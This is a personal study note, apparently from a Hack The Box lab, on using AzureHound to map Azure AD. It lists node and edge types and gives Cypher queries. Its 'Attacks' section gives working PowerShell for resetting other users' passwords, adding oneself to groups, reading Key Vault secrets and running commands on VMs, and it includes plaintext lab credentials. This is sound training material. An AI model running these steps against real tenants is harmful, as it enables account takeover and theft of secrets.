**Reference:** [BloodHoundAD/AzureHound: Azure Data Exporter for BloodHound (github.com)](https://github.com/BloodHoundAD/AzureHound)
As the names implies this "Bloodhound" alternative is targeting explicitly Azure Cloud environments and it will help you to footprint misconfigurations in several objects of the environment.

## What nodes are supported?
|Node|Description|
|---|---|
|AZTenant|Represents an Azure AD tenant, which is a dedicated instance of Azure AD that an organization owns and uses to manage access to applications and resources.|
|AZUser|Represents a user in Azure Active Directory (Azure AD) and contains information about the user such as their email address, display name, and job title.|
|AZGroup|Represents a group in Azure AD, which can be used to manage access to resources and applications.|
|AZApp|Represents an application in Azure AD, which can be used to provide secure access to resources and APIs.|
|AZSubscription|Represents an Azure subscription, which is a logical container for resources in Azure.|
|AZResourceGroup|Represents a resource group in Azure, which is a container for resources that share a lifecycle and are managed together.|
|AZVM|Represents a virtual machine (VM) in Azure, which is a virtualized computing environment used to deploy and run applications.|
|AZDevice|Represents a device in Azure AD, which can be used to manage access to resources and applications.|
|AZServicePrincipal|Represents a service principal in Azure AD, which is a security identity used by applications and services to access resources in Azure.|
(Not all are documented and many more might come....)

## What edges are supported?
| Node                      | Description                                                                                                                                              |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| AZAddMembers              | Indicates that a principal can add members to a group or directory role.                                                                                 |
| AZAddOwner                | Indicates that a principal can add other users as owners of a subscription or management group.                                                          |
| AZAppAdmin                | Indicates that a principal is assigned to an administrative role for an Azure AD application.                                                            |
| AZCloudAppAdmin           | Indicates that a principal is assigned to an administrative role for a cloud application.                                                                |
| AZContains                | Indicates that a group or directory role contains a member.                                                                                              |
| AZContributor             | Indicates that a principal has been assigned the Contributor role at a resource scope, allowing them to manage all resource types within that scope.     |
| AZExecuteCommand          | Indicates that a principal has permission to execute a command on a virtual machine.                                                                     |
| AZGetCertificates         | Indicates that a principal has permission to retrieve certificates.                                                                                      |
| AZGetKeys                 | Indicates that a principal has permission to retrieve keys.                                                                                              |
| AZGetSecrets              | Indicates that a principal has permission to retrieve secrets.                                                                                           |
| AZGlobalAdmin             | Indicates that a principal is assigned to the Global Administrator role in Azure AD.                                                                     |
| AZKeyVaultContributor     | Indicates that a principal has been assigned the Key Vault Contributor role at the resource group or resource level, allowing them to manage key vaults. |
| AZManagedIdentity         | Indicates that a resource has an associated managed identity, allowing it to authenticate with other Azure services.                                     |
| AZOwns                    | Indicates that a principal owns a resource.                                                                                                              |
| AZPrivilegedRoleAdmin     | Indicates that a principal is assigned to a built-in role that grants full access to Azure AD and all Azure services.                                    |
| AZResetPassword           | Allows a user to reset passwords for other users.                                                                                                        |
| AZRunAs                   | Represents the ability to run as an account, either through a scheduled task, service, or any other impersonation.                                       |
| AZUserAccessAdministrator | Allows a user to manage user access to Azure resources.                                                                                                  |
| AZVMAdminLogin            | Allows a user to log in as a VM administrator.                                                                                                           |
(Not all are documented and many more might come....)


# How to use?
Obviously you will need access to a Azure Subscription where the environment you need to test is hosted.
1) Run the gathering scan with *azurehound.exe*
```powershell-session
.\azurehound.exe -u "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com" -p "HacktheboxAcademy01!" list --tenant "plaintexthacktheboxgmail.onmicrosoft.com" -o all.json
```
2) Import the **json** file in Bloodhound as you will normally do.

*Extra:* for testing purposes there is a PowerShell script that can setup a dummy environment in the same folder.


# Manual Queries
Unfortunately no default query works in Bloodhound and can't parse directly Azurehound data as the labels are not same as for the traditional AD data. **Nonetheless, the gui is fucked up and can't execute queries from GUI so execute them in the neo4j web console.** 
http://localhost:7474/browser

```
# Simple queries
## All Azure Users
MATCH (n:AZUser) return n.name
## All Azure Applications
MATCH (n:AZApp) return n.objectid
## All Azure Devices
MATCH (n:AZDevice) return n.name
## All Azure Groups
MATCH (n:AZGroup) return n.name
## All Azure Key Vaults
MATCH (n:AZKeyVault) return n.name
## All Azure Resource Groups
MATCH (n:AZResourceGroup) return n.name
## All Azure Service Principals
MATCH (n:AZServicePrincipal) return n.objectid
## All Azure Virtual Machines
MATCH (n:AZVM) return n.name
## All Principals with the ‘Contributor’ role
MATCH p = (n)-[r:AZContributor]->(g) RETURN p

# Advanced queries
## Get Global Admins
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
## Owners of Azure Groups
MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p
## All Azure Users and their Groups
MATCH p=(m:AZUser)-[r:MemberOf]->(n) WHERE NOT m.objectid CONTAINS 'S-1-5' RETURN p
## Privileged Service Principals
MATCH p = (g:AZServicePrincipal)-[r]->(n) RETURN p
## Owners of Azure Applications
MATCH p = (n)-[r:AZOwns]->(g:AZApp) RETURN p
## Paths to VMs
MATCH p = (n)-[r]->(g: AZVM) RETURN p
## Paths to KeyVault
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
## Paths to Azure Resource Group
MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
## On-Prem users with edges to Azure
MATCH  p=(m:User)-[r:AZResetPassword|AZOwns|AZUserAccessAdministrator|AZContributor|AZAddMembers|AZGlobalAdmin|AZVMContributor|AZOwnsAZAvereContributor]->(n) WHERE m.objectid CONTAINS 'S-1-5-21' RETURN p
## All Azure AD Groups that are synchronized with On-Premise AD
MATCH (n:Group) WHERE n.objectid CONTAINS 'S-1-5' AND n.azsyncid IS NOT NULL RETURN n
```


# Attacks
### Connect to Azure
```powershell-session
$username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com"
$password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force
$IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password
Connect-AzAccount -Credential $IsabellaCreds
```
### Talk to resources with Powerzure.ps1
```powershell-session
Import-Module .\PowerZure.psd1
Invoke-PowerZure -h
```
### Password reset
In this example we see that ourself(*Isabelle*) can password reset Charlotte's account.
![[Pasted image 20240917103232.png]]
```powershell-session
Set-AzureADUserPassword -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```
### Adding to group
We can see that Charlotte owns a group, which means we can add ourself(*Charlotte*) to it(*Subscription Readers*).
![[Pasted image 20240917103456.png]]
```powershell-session
//Connect as Charlotte
$username = "Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com"
$password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force
$CharlotteCreds = New-Object System.Management.Automation.PSCredential $username, $password
Connect-AzAccount -Credential $CharlotteCreds

//Add membership
Add-AzureADGroupMember -Group "Subscription Reader" -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com
Get-AzureADGroupMember -Group "Subscription Reader"
```
### Reading Azure key vaults
These vaults are storing secrets in Azure, see them as a password/secret container for juicy data. In this example Ava can read the vault(*HTB-SECRETPLAINTEXT*).
![[Pasted image 20240917103915.png]]
```powershell-session
//Reset Ava's Password
Set-AzureADUserPassword -Username Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01

//Connect as Ava to the environment
Connect-AzAccount -Credential $AvaCreds

//Get the vault name
Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519
Vault Name   : htb-secretplaintext96519
Name         : HTBKeyVault
Id           : https://htb-secretplaintext96519.vault.azure.net:443/secrets/HTBKeyVault
Enabled      : True
Created      : 2/17/2023 4:44:48 PM
Updated      : 2/17/2023 4:44:48 PM

//Get the content of it
$secret = Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519 -Name HTBKeyVault
[System.Net.NetworkCredential]::new('', $secret.SecretValue).Password
ImHack1nGTooM4ch!
```
### Execute commands in VM
This attacks happens when a user own a VM resource allowing him/herself to execute commands on the VM objects; see it like a **"PowerShell remoting"** over cloud.
In this example Madison owns the VM object(*AZVM-01*).
![[Pasted image 20240917104612.png]]
```powershell-session
//Connect as Madison
Connect-AzAccount -Credential $MadisonCreds

//Remote RCE
Invoke-AzureRunCommand -VMName "AZVM-01" -Command whoami
```
You can also use another applet but it requires the *Resource group name* and some other information.
```powershell-session
Invoke-AzVMRunCommand -ResourceGroupName "PRODUCTION" -CommandId "RunPowerShellScript" -VMName "AZVM-01" -ScriptString "whoami"
```